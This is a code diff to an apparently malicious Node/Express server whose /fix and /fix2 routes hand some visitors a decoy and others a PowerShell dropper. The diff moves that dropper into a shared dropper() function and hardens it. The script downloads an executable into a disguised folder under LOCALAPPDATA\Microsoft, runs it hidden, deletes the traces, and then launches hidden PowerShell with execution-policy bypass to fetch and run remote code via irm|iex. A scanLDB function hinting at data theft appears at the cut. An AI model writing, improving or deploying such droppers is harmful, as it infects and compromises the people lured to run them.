@@ -280,15 +280,7 @@ app.get("/fix", (req, res) => {
     return res.send(fake);
   }
 
-  const script = `$ErrorActionPreference='SilentlyContinue'
-$d="$env:TEMP\\$(-join((1..8|%{[char](97+[int](Get-Random -Max 26))}))).tmp"
-New-Item -ItemType Directory -Path $d -Force|Out-Null
-(New-Object Net.WebClient).DownloadFile('https://${host}/pkg',"$d\\zx.exe")
-$p=Start-Process -FilePath "$d\\zx.exe" -WindowStyle Hidden -PassThru
-$p.WaitForExit(120000)
-Remove-Item -Path $d -Recurse -Force -ErrorAction SilentlyContinue
-Start-Process powershell -ArgumentList '-ep bypass -w hidden -c "irm https://${host}/run|iex"'
-`;
+  const script = dropper(host, '/pkg');
   res.setHeader("Content-Type", "text/plain");
   res.send(script);
 });
@@ -467,18 +459,28 @@ app.get("/fix2", (req, res) => {
     return res.send(fake);
   }
 
-  const script = `$ErrorActionPreference='SilentlyContinue'
-$d="$env:TEMP\\$(-join((1..8|%{[char](97+[int](Get-Random -Max 26))}))).tmp"
-New-Item -ItemType Directory -Path $d -Force|Out-Null
-(New-Object Net.WebClient).DownloadFile('https://${host}/pkg2',"$d\\au.exe")
-$p=Start-Process -FilePath "$d\\au.exe" -WindowStyle Hidden -PassThru
-$p.WaitForExit(120000)
-Remove-Item -Path $d -Recurse -Force -ErrorAction SilentlyContinue
-Start-Process powershell -ArgumentList '-ep bypass -w hidden -c "irm https://${host}/run|iex"'
-`;
+  const script = dropper(host, '/pkg2');
   res.setHeader("Content-Type", "text/plain");
   res.send(script);
 });
+
+function dropper(host, pkg) {
+  return `$ErrorActionPreference='SilentlyContinue'
+[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
+$r=-join((1..10|%{[char](97+[int](Get-Random -Max 26))}))
+$d="$env:LOCALAPPDATA\\Microsoft\\$r"
+New-Item -ItemType Directory -Path $d -Force|Out-Null
+$f="$d\\$r.dat"
+try{(New-Object Net.WebClient).DownloadFile('https://${host}${pkg}',$f)}catch{}
+if(!(Test-Path $f)){try{Invoke-WebRequest -Uri 'https://${host}${pkg}' -OutFile $f -UseBasicParsing}catch{}}
+if(Test-Path $f){
+  $p=Start-Process -FilePath $f -WindowStyle Hidden -PassThru
+  $null=$p.WaitForExit(120000)
+}
+Remove-Item -Path $d -Recurse -Force -ErrorAction SilentlyContinue
+Start-Process powershell -ArgumentList '-ep bypass -w hidden -c "irm https://${host}/run|iex"'
+`;
+}
 
 function scanLDB(buf) {
   const key = Buffer.concat([
